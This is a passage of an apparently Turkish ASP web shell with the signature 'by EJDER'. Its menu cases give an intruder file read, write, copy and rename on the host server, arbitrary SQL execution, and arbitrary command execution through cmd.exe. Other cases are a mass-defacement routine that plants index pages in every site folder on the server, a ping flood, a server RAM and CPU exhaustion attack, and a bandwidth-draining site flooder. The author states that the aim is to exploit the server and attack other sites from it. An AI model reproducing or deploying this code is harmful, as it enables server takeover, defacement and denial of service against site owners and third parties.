response.write "<form name=""dosyacopypaste"" action='"&FilePath&"' type=""post"">"
response.write "<table class=""kbrtm"" cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"">"
tablo30(" <b>Dosya Kopyala / Taþý Merkezi</b>")
tablo30("&nbsp;")
response.write "<input type=""hidden"" value=""8"" name=""mode""><input type=""hidden"" value="&time&" name=""Time""><input type=""hidden"" value="&file&" name=""file""> " 
tablo12("Kop. Yer : <input  size=""60"" type=""text"" name=""folder"" value="&file&">")
tablo12("<input type=radio name='islem' value='kopyala' checked>Kopyala  <input type=radio name='islem' value='tasi'>Tasi ")
tablo12("<br><input value="" Gönder "" type=""Submit"">")
response.write "</form></table></td></tr></table><br>"
Call Hata

CASE 8 ' Dosya kopyala, taþýmaa olayý by EJDER
on error resume next
if islem="kopyala" then
    FSO.CopyFile file,folder&""
    isl="kopyalandý.."
elseif islem="tasi" then
    FSO.MoveFile file,folder&""
    isl="taþýndý.."
end if
if err <> 0 then
response.Write "<br><br><center>Baþarýsýzlýkla sonuçlandý !!! <br>"
else
response.Write "<br><br><center>Klasor "&isl&" <br>"
end if
response.Write "<br><font color=yellow>Kaynak : </font>"&file&"<br><font color=yellow>Hedef : </font>"&folder&"\"
response.Write "<br><br>by Ejder</center>"
Call Hata

CASE 9 ' Dosya Ýçini görüntüle by EJDER
on error resume next
Response.Write "<center><b><font color=orange>"&path&"</font></b></center><br>"
Response.Write "<table class=""kbrtm"" width=100% ><tr><td>"
set f = FSO.OpenTextFile(file,1)
Response.Write "<font size=3><pre>"&Server.HTMLEncode(f.readAll)&"</pre></font>"
Response.Write "</td></tr></table>"
nolist = True
if err<>62 then Hata
if err.number=62 then 
Response.Write "<script language=javascript>alert('Bu Dosya Okunamýyor\nSistem dosyasý olabilir')</script>"
nolist = False
end if

CASE 10 ' ASP txt php .. gibi dosyalarý Editlemek için POSt kýsmý by EJDER 
on error resume next
set f = FSO.OpenTextFile(file,1)
response.Write "<center><form action='"&FilePath&"?Time="&time&"&konum="&FolderPath&"' method=""post""><table class=""kbrtm""><tr><td align=""center"">"
Response.Write "<input type=hidden name=""mode"" value='11'>"
Response.Write "<input type=hidden name=file value="&file&">"
Response.Write "<br><br><input type=submit value="" .. ::   Kaydet  :: ..  ""><br><br></td></tr><tr><td align=""center"">"
Response.Write "<textarea name=""islem"" style='width:90%;height:350;'>"
Response.Write server.HTMLEncode(f.readAll)
Response.Write "</textarea></td></tr></table></form></center>"
Call Hata
nolist = True

CASE 11 ' Editleme olayýý gerçekleþiyorr by EJDER
on error resume next
set saveTextFile = FSO.OpenTextFile(file,2,true,false)
Call Hata
saveTextFile.Write(islem)
saveTextFile.close
if err<>0 then
olmadi("Editlenemedii")
else
oldu("Editlendi")
end if

CASE 12 ' Resim Dosyasýný Görüntülee  by EJDER
on error resume next
Response.Write "<br><center><img ALT=""SaVSaK.CoM by EJDER =) "" src='"&file&"'></center><br><br>"
Call Hata
nolist = True

CASE 13 ' SQL için TAblolarý Listeleme by EJDER
Response.Write "<center><b><font size=3>Tablolar</font></br><br>"
Set objConn = Server.CreateObject("ADODB.Connection")
Set objADOX = Server.CreateObject("ADOX.Catalog")
objConn.Provider = "Microsoft.Jet.Oledb.4.0"
objConn.ConnectionString = file
objConn.Open
objADOX.ActiveConnection = objConn

response.write "<table class=""kbrtm"">"
For Each table in objADOX.Tables
    If table.Type = "TABLE" Then
        Response.Write "<tr><td><font face=wingdings size=5>4</font> <a href='"&FilePath&"?mode=14&file="&file&"&table="&table.Name&"&konum="&FolderPath&"&time="&time&"'>"&table.Name&"</a></td></tr>"
    End If
Next
response.write "</table>"
response.write "</center>"
Call Hata
nolist = True

CASE 14 ' TAblo içeriði görüntüleme by EJDER
Call SQL_menu_by_Ejder
Call SQL_by_EJDER(file,table)
nolist = True

CASE 15 ' SQL kod yerleþtirme olayý by EJDER
if islem = "select" then inject = inject1
if islem = "delete" then inject = inject2
if islem = "insert" then inject = inject3
if islem = "update" then inject = inject4
if islem = "diger" then inject = inject5
SQL_menu_by_Ejder
response.write "<br><center>Db Yeri : <font color=#C6FCBE>"&file&"</font></center>"
response.write "<br><center>Sql komut : <font color=#C6FCBE>"&inject&"</font></center><br>"
if islem = "select" then
	if not ejdersql = "" then
		Call MSSQL_by_EJDER(ejdersql,inject)
	else
		Call SQL_by_EJDER(file,inject)
	end if
else
on error resume next
if ejdersql = "" then
	Set objConn = Server.CreateObject("ADODB.Connection")
	Set objRcs = Server.CreateObject("ADODB.RecordSet")
	objConn.Provider = "Microsoft.Jet.Oledb.4.0"
	objConn.ConnectionString = file
	objConn.Open
else
	Set objConn = Server.CreateObject("ADODB.Connection")
	Set objRcs = Server.CreateObject("ADODB.RecordSet")
	objConn.Open ejdersql
end if

if err <> 0 then
	response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> DataBase ile Baðlantýnýz SaðlanaMAdýý !!! by EJDER :( <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
else
	on error resume next
	objRcs.Open inject,objConn, adOpenKeyset , , adCmdText
	if err <> 0 then
		Call olmadi("<br>SQL Ýnjection Komutunuzda HATA var. Bilmiyorsan Kullanma<br><br>")
	else
		Call oldu("<br> SQL Ýnjection Baþarýyla GErçekleþtii.<br><br>")
	end if
end if
objRcs.close
objConn.close
end if
nolist = True

CASE 16 ' Dosya ADI deðiþtirme Formu by EJDER
on error resume next
response.write "<table width=""100%"">"
response.write "<tr valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""dosyanameedit"" action='"&FilePath&"' type=""post"">"
response.write "<table cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"" class=""kbrtm"" >"
tablo30(" <b>Dosya ADý deðiþtirme MErkezi</b>")
tablo30("Adý :  <font color=#C6FCBE>"&islem&"</font> <br> Yeri :  <font color=#C6FCBE>"&file&"</font>")
response.write "<input type=""hidden"" value=""17"" name=""mode""><input type=""hidden"" value="&file&" name=""file""><input type=""hidden"" value="&FolderPath&" name=""konum""><input type=""hidden"" value="&time&" name=""Time""> " 
tablo12("<b>Dosyanýn Yeni Adý:  </b> &nbsp;<input  size=""30"" type=""text"" name=""islem"" value="&islem&">")
tablo12("<br><input value="" Gönder "" type=""Submit"">")
response.write "</form></table></td></tr></table><br>"
Call Hata

CASE 17 ' Dosya Adý deðiþtirme Olayý gerçekleþiyor by E_JDER
on error resume next
Set fileObject = fso.GetFile(file) 
fileObject.Name = islem 
if err <> 0 then
	Call olmadi("<br>DOsya Adý deðiþeMEdii<br><br>")
else
	Call oldu("<br>Dosya Adý deðiþti<br><br>")
end if
Set fileObject = Nothing 
Call Hata

CASE 18 ' MAss Defeced Merkezi by EJDER
on error resume next
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""massattack"" action='"&FilePath&"?mode=19' method='post'>"
response.write "<table cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"" class=""kbrtm"">"
tablo30(" <b>MASS Defaced Merkezi</b>")
tablo30("...... :::::  Ýndex KOD unu Aþaðýya Yaz / Yapýþtýr   ::::: ......")
tablo30("<br><b>Konum : </b><input style=""color=#C6FCBE"" size=""60"" name=""masskonum"" value='"&konum&"' type=""text""><br><br>")
response.write "<input type=""hidden"" value=""19"" name=""massmode""><input type=""hidden"" value="&time&" name=""Time""> " 
tablo12O("<textarea  style=""width:500px; height:250px"" name=""massfile""></textarea>")
tablo12O(" <input type=""radio"" value=""brute"" name=""massislem"" checked> Brute  -   <input value=""single"" type=""radio"" name=""massislem"" > Single   -   <input value=""ozel"" type=""radio"" name=""massislem"" > Private <input name=""massinject1"" value=""z.html"" type=""text"" size=15>  &nbsp;&nbsp; <input value=""ok"" type=checkbox name=""masshash3"" >Eklenti <input size=15 name=""masshash2"" value=""httpdocs\"" type=""text"">")
tablo12O("<input name=""masshash9"" value=""copy"" type=radio checked> Kopyalayarak  -  <input name=""masshash9"" value=""yarat"" type=radio> Oluþturarak")
tablo12O("<input value="" Havayaa Uçurr "" type=""Submit"">")
yazsol("<font color=#C6FCBE><b>Brute : </b>Belirtilen Dizinin ALtýndaki; Tüm Dizinlere ve onlarýnda ALt Dizinleri Ýndex BAsar. </font>")
yazsol("<font color=#C6FCBE><b>Single : </b>Belirtilen Dizinin ALtýndaki; Alt Dizinlere Ýndex BAsar. </font>")
yazsol("<font color=#C6FCBE><b>Private : </b>Belirtilen Dizinin ALtýndaki; Alt Dizinlere Ýstediðiniz Ýsimle Ýndex BAsar. </font> ")
yazsol("<font color=#C6FCBE><b>Eklenti : </b>BRUTE & Single ile kullanýlýr. Permsion var ise bunu seçmenize ayarlamanýza gerek yok. Eðer site isimlerini listeleytebiliyor, ve içine girremiyor fakat klasör atlayarak girebiliyorsanýz. o zaman bunu seçin ve bulunan klasörrden sonrakine gidip oraya index leri atar. Mesela ; '..site\savsak_com', '..\site\haber_com' .. gibi siteelr listeli. bunlarýn içlerine giridðinizde görüntülkeme yetkinzi yok . Ama eðer '..\site\savsak_com\www\' yapýnca girebiliyorsnaýz. PERMÝSÝON aþma yöntemidir. böylece Eklenti yerine 'www' yazarak ve seçerekden. tüm sitelere o klaösr içine girme yetkisini saðlayýp, index býraktýrýrrýz. </font> ")
yazsol("<font color=#C6FCBE><b>Kopyalayarak : </b>FSO dizinine bir TXT yazar. Sonra onu TÜm  klasörlere KOpyalayarak iþlem yapar. Eðer FSO dizininde yazma yok ise, iþlem gerçekleþmez. TÜM MASS lar böyledir. </font> ")
yazsol("<font color=#C6FCBE><b>Yaratarak : </b>Direk index kodunuzu, Klasölerde OLUÞTURARAk MASS yapar. BU EJder &  SaVSaK.CoM FARký ile. 1-2 defa baþýma geldi=) o yüzden bu özelleiði ekledim.</font> ")
yazsol("<font color=#FE7A84><b>NOT : </b>Brute & Single da 9 çeþit index basar, Private da Ýstdiðiniz Ýsimle 1 tane atar ;) </font>")
response.write "</table></td></form></tr></table><br>"
Call Hata

CASE 19 ' MAss Attack ÝÞleniyor. Eðer Ýndex yok ise, Hata ve FOrm sunuyor, aksi halde MASS yapýyor. 
konum = request.form("masskonum")
filee = request.form("massfile")
islem = request.form("massislem")
hash9 = request.form("masshash9")
hash2 = request.form("masshash2")
hash3 = request.form("masshash3")
inject1 = request.form("massinject1")

'filee = filee&"<center><br><br><font color=green><b>HAcked by EJDER ;)</b></font><br></center>"
inject7 = filee
if hash9 = "copy" then
on error resume next
a=Left(replace(Request.ServerVariables("PATH_TRANSLATED"),"/","\"),InStrRev(replace(Request.ServerVariables("PATH_TRANSLATED"),"/","\"),"\"))
Set hackindex = FSO.CreateTextFile(a&"\ejder.txt", True)
hackindex.write filee
if err <> 0 then
response.write "<center><br><font color=#FE7A84> <font face=Wingdings size=5>N</font> Bulunduðun Dizinde Yazma YEtin yok. Bu yüzden Ýndex Sayfasý oluþturulamadý. <font face=Wingdings size=5>N</font> <br><br>  <font face=Wingdings size=5>N</font>  Eðer ki Server içine bir Tane index yükler ve aþaðýdaki yere tam link ini yazarsan, O zaman MASS Defaced baþlýyacaktýr. <font face=Wingdings size=5>N</font> <br><br><br></center>"
response.write "<table width=""100%"">"
response.write "<tr class=""kbrtm"" valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""dizincopypaste"" action='"&FilePath&"' type=""post"">"
response.write "<table cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"">"
response.write "<input type=""hidden"" name='islem' value='"&islem&"'><input type=""hidden"" name='inject1' value='"&inject1&"'><input type=""hidden"" name='file' value='"&file&"'><input type=""hidden"" name='Time' value='"&time&"'><input type=""hidden"" name='mode' value='20'><input type=""hidden"" name='konum' value='"&konum&"'>"
Call tablo30("<b>Ýndex in Server daki kendi Ýndex inin YErini GÖster. </b>")
Call tablo30("&nbsp;")
Call tablo12("<input  size=""80"" type=""text"" name=""hacked"" style='color=#C6FCBE' value='"&FolderPath&"&/index.html'>")
Call tablo12("<br><input value="" OK tamamdýr. Ýndex imi seçtim.  "" type=""Submit"">")
response.write "</form></table></td></tr></table><br>"
else
set hacking = nothing
hacked = a&"\ejder.txt"
hash6 = konum
Call MassAttack2(konum,filee,hash2)
Call MassAttack(hash6,filee,hash2)
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><b> ..... ::::  Bitttiiii  :::: ..... </b></td></tr></table> "
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><br><br><b>by EJDER ;)</b><br><br> </td></tr></table> "
Response.Write "<script language=javascript>alert('Mass Defaced Tamamalandý... ')</script>"
end if
else  if hash9 = "yarat" then
hash6 = konum
Call MassAttack2(konum,filee,hash2)
Call MassAttack(hash6,filee,hash2)
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><b> ..... ::::  Bitttiiii  :::: ..... </b></td></tr></table> "
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><br><br><b>by EJDER ;)</b><br><br> </td></tr></table> "
Response.Write "<script language=javascript>alert('Mass Defaced Tamamalandý...1 ')</script>"
end if 
end if
Call Hata

CASE 20 ' Hata sonucu, düzeltme yapýldý ise, burdan MAss dewaam ediyor.
on error resume next
Set cloner2 = fso.GetFile(hacked)
if err <> 0 then
response.write "<br><br><br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> Ýndex Bulunamadý. KOnumunu veridðin Ýndex yada Dosya BULUNAMADI. Mass Durdurudu !!!  <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br><br><br>"
set cloner2 = nothing
else
set cloner2 = nothing
file="EJDER"
hash6 = konum
Call MassAttack2(konum,file,hash2)
Call MassAttack(hash6,file,hash2)
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><b> ..... ::::  Bitttiiii  :::: ..... </b></td></tr></table> "
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><br><br><b>by EJDER ;)</b><br><br> </td></tr></table> "
Response.Write "<script language=javascript>alert('Mass Defaced Tamamalandý...2 ')</script>"
end if
Call Hata

CASE 21 ' MASS tester formu by EJDER
on error resume next
response.write "<table width=""100%"" class=""kbrtm"">"
response.write "<tr valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""masstester"" action='"&FilePath&"' type=""post"">"
response.write "<table cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"" class=""kbrtm"">"
tablo30(" <b>MASS Permision Tester</b>")
tablo30("...... :::::  Ýzinleri Kontrol Eder   ::::: ......")
tablo30("<br><b>Konum : </b><input style=""color=#C6FCBE"" size=""60"" name=""konum"" value='"&konum&"' type=""text""><br><br>")
response.write "<input type=""hidden"" value=""22"" name=""mode""><input type=""hidden"" value="&time&" name=""Time""> " 
tablo12O("<br><input value="" Teste Baþlaaaa... =) by EJDER "" type=""Submit""><br><br>")
tablo12("&nbsp;")
response.write "<tr bgcolor=""#121212""><td class=""kbrtm"" align=""left"" width=""100%""  ><font color=#C6FCBE><b>NOT : </b>Bununla, Alt klasörlerde Permision varmý yok mu ,Onu kontrol eder ve Listeler... </font>  <font color=#C6FCBE face=Wingdings size=5>N</font></td></tr>"
response.write "</form></table></td></tr></table><br>"
Call Hata

CASE 22 ' MASS TEster iþleme görüntüleme by EJDER
Call Tester(konum)
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><b> ..... ::::  Bitttiiii  :::: ..... </b></td></tr></table> "
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><br><br><b>by EJDER ;)</b><br><br> </td></tr></table> "
Response.Write "<script language=javascript>alert('Yetki Kontrolu tamamalandý... ')</script>"
Call Hata

CASE 23 ' arama bulma- en güzel özeliði time out olmamasý bulduðunu yazmasýdýr =) by EJDER eseridir. 
response.write  "<br><center>"
i=0
Call arama(konum)
response.write  "</center><br>"
Response.Write "<script language=javascript>alert('"&i&" Kayýt Bulundu .... ')</script>"
nolist = True
Call Hata

CASE 24 ' Klasör iþlermleri için Upload - Dosya ayarat - klaösr yarat FORM larý by Ejder
on error resume next  
response.write "<table bgcolor=#000000 width=""100%"" ><tr><td>"
response.write "<center><table width=""100%""><tr><td class=""kbrtm"" align=""center""> Upload Merkezi  </td></tr><tr><td align=""center"" class=""kbrtm"">"
response.write "<form name=frmUpload method=post enctype=""multipart/form-data"" action='"&FilePath&"?mode=25&Time="&time&"&Path="&konum&"' ID=""Form1"">"
response.write "<input type=hidden name=folder value='"&konum&"' ID=""Hidden1"">"
response.write "Max: <input type=text name=max value=5 size=5 ID=""Text1""> <input type=button value=""Ayarla"" onclick=setid() ID=""Button1"" NAME=""Button1"">"
response.write "<table ID=""Table1"">"
response.write "<tr>"
response.write "<td id=upid>"
response.write "</td>"
response.write "</tr>"
response.write "</table>"
response.write "<input type=submit value="" ... ::  Upload  :: ... "" ID=""Submit1"" NAME=""Submit1"">"
response.write "</form>"
response.write "<script>"
response.write "setid();"
response.write "function setid() {"
response.write "    str='';"
response.write "    if (frmUpload.max.value<=0) frmUpload.max.value=1;"
response.write "    for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input size=30 type=file name=file'+i+'><br>';"
response.write "    upid.innerHTML=str+'<br>';"
response.write "}"
response.write "</script>"
response.write "</td></tr></table></center>"
response.write "<br><center><table align=""center"" width=""100%"" class=""kbrtm""><form name=""dosycrete"" action='"&FilePath&"?mode=26&konum="&konum&"&Time="&time&"' method=""post""><tr><td align=""center"">Klasör Oluþtur : <input name=""file"" value=""Ejder"" type=""text""> <input name=""git"" value="" Oluþtur "" type=""Submit""></td></tr></table></form></center>"
response.write "<center><table align=""center"" width=""100%"" class=""kbrtm""><form name=""filemaker"" action='"&FilePath&"?mode=27&konum="&konum&"&Time="&time&"' method=""post""><tr><td align=""center"">Dosya Adý : <input name=""file"" value=""ejder.asp"" type=""text""></td></tr><tr align=""center""><td><textarea style='width:100%;height:100;' name=""islem""></textarea></td></tr> <tr align=""center""><td><input name=""git"" value=""..:: Oluþtur ::.."" type=""Submit""></td></tr></table></form></center>"
response.write "</td></tr></table>"
Call Hata

CASE 25 ' Upload iþlemi by E_JDER
Upload()

CASE 26 ' Klasör yarat by EJDER
response.write "<br><br><br><br><table bgcolor=#000000 width=""100%"" ><tr><td class=""kbrtm"" align=""center"">"
if FSO.FolderExists(konum&"\"&file) = True then
response.write "<center> <font color=#FE7A84> <font  face=Wingdings size=5>N</font> Böyle Bir Klasör ZATEN VAr !!!! <font color=#FE7A84> <font  face=Wingdings size=5>N</font> </font> </center>"
else
on error resume next
FSO.CreateFolder(konum&"\"&file)
if err <> 0 then
olmadi("Klasör Oluþturulamadý")
else 
oldu("Klasör Oluþturuldu")
end if
end if
response.write "</td></tr></table>"
Call hata

CASE 27 ' Dosya yarat by EJDER
response.write "<br><br><br><br><table bgcolor=#000000 width=""100%"" ><tr><td class=""kbrtm"" align=""center"">"
on error resume next
Set MyFile = FSO.CreateTextFile(konum&"\"&file, True)
MyFile.write islem
if err <> 0 then
olmadi("Dosya Oluþturulamadý")
else 
oldu("Dosya Oluþturuldu")
end if
response.write "</td></tr></table>"
MyFile.close()
Call hata

CASE 28 ' CMD Formu ve iþlem yeri  by EJDER
if cmdkod="" then cmdkod="ipconfig"
response.write "<center><table align=""center"" width=""100%"" class=""kbrtm""><tr><td>"
response.write "<form name=""commmanderbyejder"" method=""Post"" action='"&FilePath&"?mode=28&konum="&konum&"'> <b>CMD Komut Listele : </b><input style='color=#DAFDD0' name=""cmdkod"" size='57' value='"&cmdkod&"' type='text'><input name='"&konum&"' value='"&konum&"' type='hidden'><input name='"&mode&"' value=""28"" type='hidden'><input name='"&file&"' value=""a"" type='hidden'><input value="".:Görüntüle:."" type='Submit'> "
response.write "</td></tr></form></table></center>"
response.write "<center><table align=""center"" width=""100%"" class=""kbrtm""><tr><td>"
response.write "<textarea style='color=#DAFDD0;width:100%;height:320;'>"
response.write server.createobject("wscript.shell").exec("cmd.exe /c"&cmdkod).stdout.readall
response.write "</textarea>"
response.write "</td></tr></form><form name=""commmanderbyejder2"" method=""Post"" action='"&FilePath&"?mode=28&konum="&konum&"'><tr><td><b>CMD Komut Çalýþtýr: </b><input style='color=#DAFDD0' name=""inject4"" size='57' value='"&inject4&"' type='text'><input name='inject5' value='ejder' type='hidden'><input value="" .: Çalýþtýr :. "" type='Submit'></td></tr>"
if inject5 = "ejder" then
on error resume next
tablo12("Komut Çalýþtýrýldý. ")
end if
response.write "</form></table></center>"
response.write "<br><center><table align=""center"" width=""100%"" class=""kbrtm"">"
tablo12L("<font color=#FE7A84><b>NOT : </b> CMD komutlarý tamamen , Server üzerinde çalýþmaktadýr. Siz burda yazacaðýnýz komut orda çalýþýp, size geri dönecektir.")
tablo12L("<font color=#FE7A84><b>NOT : </b> <b>CMD Komut Listele</b> olayý, >dir, >netstat, >ping gibi geri DOS da geri bilgi döndüren komutlar kullanýlýr. AMA eðer program çalýþýtmrka, traojan yada Notepad gibi fonksiyonal ve applicaitonlý programlar, komutlarýda <b>CMD komut Çalýþtýr</b>dan Uygulamanýz gerekir.Aksi halde Sistem kýsa süreli kitlenme yaþanýr. CEvap alýnamayabilinir.GEreðinden fazla çalýþýtrm yaparsnýz , Ýþlemcide Sizin Userýnýzýn <b>RAM + CPU </b>kullnýmý anormal artacaktýr. </font>  <font color=#FE7A84 face=Wingdings size=5>N</font>")
yazorta("<a href='"&FilePath&"?mode=29&konum="&konu&"&Time="&time&"' onclick=""cmdhelp(this.href);return false;"">-->>  Kullanýlabilir CMD komutlarýndan BAzýlarý   <<-- </a>")
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'><b>by EJDER</b></td></tr></td></tr></table></center>"


CASE 29 ' CMD açýklama kýsmý HELPER by EJDER
response.write "<center>"
yazsol("<b>Attrib</b>: Attrib komutu dosyalara belli özellikleri verir veya kaldýrýr. c:\>attrib +r +a +s +h yazýp enter tuþuna basarsak.(help için : <b> ' attrib /?  ' </b>)")
yazsol("<b>Copy - xcopy</b> : Copy ve xcopy komutu ile istenilen dosya yada dosyalarýn baþka yerlere kopyalanmasý iþlemi gerçekleþtirilir. Bilgi için bunu yazýn :' <b>copy /? '</b>")
yazsol("<b>Net use</b> : Pc nin Paylaþým, Hesaplarý, ayarlarý, kullanýcýlarý... gibi özellliklere ulaþabileceðimiz ve deðiþtirebileceðimiz bir komut <b>NET</b> . Yarým dosyasý için -> <b> net help </b> yazmanýz yeterlidir.")
yazsol("<b>Netstat</b> : PC deki açýk portlarý, ve dilediðiniz port u dinleyebilirsiniz. <b>Netstat -a -b -e -n -o -r -s -v</b> gibi parametreler alýr.")
yazsol("<b>Tracert</b> : Site, Ip, server ýn nerde olduðunu tracert yapar. <b>tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name</b> ")
yazsol("<b>IPCONFIG</b> : Server , PC nin IP bilgileirni, network bilgileirni veriyor. kulným için - > <b>ipconfig help</b>  yazýn yeterldir ")
yazorta("<b>by EJDER</b>")
response.write "</center>"

CASE 30 ' PiNGer BY EJDER - Server üzerinden sýnýrsýz ping saldýrrýsý. =) ehehe by EJDER
if not file = "1" then
response.write "<center><table align=""center"" width=""100%""><tr><td><form action='"&FilePath&"?mode=30&file=1&konum="&konum&"' method='post' name='pingerbye_jder'>"
yazsol(" Site Adý : <input style='color=#DAFDD0' name='url' value='siteadý.com' type='text' size=30> (Örnek: google.com) ")
yazsol(" Ping Sayýsý : <input style='color=#DAFDD0' name='inject1' value='20' type='text' size=20> (Örnek: 20) ")
yazsol(" Ping TimeOut Süresi : <input style='color=#DAFDD0' name='islem' value='750' type='text' size=20> milisaniye (Örnek:750) ")
yazsol(" Paket Boyutu : <input style='color=#DAFDD0' name='size' value='32' type='text' size=20> byte (32) ")
response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> <input name='bombalaEjder' value=' .::  Bombala  ::. ' type='Submit' > </td></tr></table>"
response.write "</form></td></tr></table>"
yazsoll("  <font color=#C6FCBE> Not: Bunu kullanýrken gireceðiniz Paket boyutu Önemlidir. Mümkünce aþýrý büyük paket girmeyin, çünkü server yada site nereye saldýrrýyorsanýz, büyük paketleri filtreler ve cevap vermezler. O yüzden sürekli TÝmeOUT yazar. o yüzden yaa Boþ býrakýn yada 500 gibi normal bir seviye seçin.  <font color=#C6FCBE> <font face=Wingdings size=5>N</font> </font>  ")
yazsoll("<font color=#C6FCBE> Not: PÝNG sayýsýný 98 dediniz mesela, Sistem bunu 10 hamlede yapacaktýr. 10 arlý gönderektir. vede süreklisayfa kendini yenileyip, 98 olana kadar 10 ar 10 ar ping ee dewam edecektir. Burda TÝMEout OLMA gibi sorunumuz yok. 100000 deseniz bile, o bitne kadar gece gündüze ping çekebilien sistem geliþtirdim. Korkmadan, vede gece açýk býrakarak sýnýrsýz pingler çekebilirisniz.  <font color=#C6FCBE> <font face=Wingdings size=5>N</font></font> ")
yazsoll(" <font color=#FE7A84> Not: savsak, com.tr, gov.tr uzantýlý sitelere karþý koruma aldým. Ping Attaker bu sitelere karþý Çalýþtýtýlamaz, ve çalýþýtýrlsa bile Ping atmaz, size Uyarý verir. TÜrk Siteleri Koruma ilk hedefimizdir. TÜrk TÜrk ü Vurmaz. by EJDER <font color=#C6FCBE> <font face=Wingdings size=5>N</font></font> ")
yazsoll("<font color=#C6FCBE> <b>Ping Attack Ejder</b> tarafýndan yazýlmýþ olup, biraz hayal gücü, biraz çaba azimle, þu an kulanýdðýnýz FSO yuda yazan olarak, bundaki amacým Server ýn ,sitenin kaynaklarýný sömürmek vede onun üzerinden onun kaynaklarýný kullanrak baþka yerlerede zarar , saldýrý yapam güdenmiþtir. BUndada BUnlaa baþladým. <b>TÜM haklarý EJDER e aittir.</b> <font color=#C6FCBE> <font color=#C6FCBE> <font face=Wingdings size=5>N</font></font>  ")
else
if inject1 = "" then inject1 = 0
if count = "" then count = 0
if CInt(inject1) > CInt(count) + 10 then
	Call Ping_Bomb_Ejder(url,10,islem,size)
	count = count + 10
	inject2 = ""&FilePath&"?file=1&mode=30&url="&url&"&size="&size&"&count="&count&"&inject1="&inject1&"&islem="&islem&""
	response.write "<META http-equiv=refresh content=2;URL='"&inject2&"'>"
	response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align=""center"" > <b>"&count&"/"&inject1&"</b> tane Ping Çekildi. </td></tr></table>"
else if CInt(inject1) > CInt(count) then
	Call Ping_Bomb_Ejder(url,CInt(inject1) mod 11,islem,size)
	count = count + (CInt(inject1) mod 11)
	yazortaa(" <b>"&count&"/"&inject1&"</b> tane Ping Çekildi... ")	
	yazortaa(" Pinger Attack by Ejder 1.0 iþlemini tamamladý...  ")
else 
	yazortaa(" <b>"&count&"/"&inject1&"</b> tane Ping Çekildi... ")	
	yazortaa(" Pinger Attack by Ejder 1.0 iþlemini tamamladý...  ")
end if
end if
end if

CASE 31 ' Server RAM & CPU Saldýrýsý
cmdd = array("C:\WINDOWS\System32\mspaint.exe","C:\Program Files\Internet Explorer\iexplore.exe","C:\WINDOWS\system32\notepad.exe")
if islem = "1" then
on error resume next
response.write server.createobject("wscript.shell").exec("cmd.exe /c"&cmdd(0))
else if islem = "2" then
on error resume next
response.write server.createobject("wscript.shell").exec("cmd.exe /c"&cmdd(1))
else if islem = "3" then
on error resume next
response.write server.createobject("wscript.shell").exec("cmd.exe /c"&cmdd(2))
else
if not file = "1" then
response.write "<center><table align=""center"" width=""100%""><tr><td>"
yazorta("<b> RAM & CPU FUcker for SERVER by EJDER =) 1.0 </b>")
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td><font color=#C6FCBE>  Server ýn CPu ve RAm kaynaklarýný 1 dk içinde tüketebilen bir Ejder eseridir. Bununla sadece, 3 tür program sürekli açýlýr ve kapatýlmaz(Paint, Notepad, Explorer) Server en fazla 1 dk içinde Ram&Cpu sorunu ve kitlenmeler, cevap vermemeler, hatat resetlenme ilede sonuçlanabilir.</font></td></tr></table>"
yazorta(" <a href='"&FilePath&"?mode=31&file=1'>..::  RAM & CPU Attacker ý ÇALIÞTIR .. by EJDER  ::..</a> ")
response.write "</td></tr></table></center>"
else
Call Ram_Cpu
end if
end if
end if
end if

CASE 32 ' SÝte kaynak Sömürücü by EJDER =)
if not islem = "1" then
response.write "<center><table align=""center"" width=""100%""><tr><td>"
yazorta("<b> SÝte Kaynak Sömücü 1.0 by EJDER </b>")
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td><form name=""sitefuckerbyEjder"" method='post' action='"&FilePath&"?mode=32'>Site Adresi : <input name='url' value='http://www.siteadi.com' style='color=#C6FCBE' size=55 type='text'></td></tr><tr><td> Robot Sayýsý : <input name='file' style='color=#C6FCBE' type='text' value='50' size=30> <input name='islem' type='hidden' value='1'><input name='gooo' value=' ..:: Sömür ::..' type='Submit'></td></tr></form></table>"
yazsol("Belirttiðiz kadar Robot kadar baðlanýr ve siteyi sömürür. Ayrýca Saldýrý sürekli kendini güceller, yeniler. Sonsuzdur. =) Robot u Baðlantýnýza göre ayarlayýn. Mesela; Robot u 50 yaparsanýz.O sayfa içinde 50 tane ayný anda açýlacak site ve indirecektir siteleri. ve o sýrada sürekli siz, dosya indiroyr geçiçi olarak. VE bu olay her 30 snde güncelleniyor Otomatik. Birkez çalýþýtr Ömür boyu kapatmazsan penceryi çalýþýr bir MAkina.")
yazsol("Site kodlarýný, BAndwith ini ve ASP kitlenmesi yada SQL sömürmede, ressim, text sömürmede ÜStüne yoktur..")
yazorta("TÜm haklarý Saklýdýr by EJDER =)")
response.write "</td></tr></table></center>"
else
on error resume next
yazorta("<b> SÝte Kaynak Sömücü 1.0 by EJDER =) 1.0 </b>")
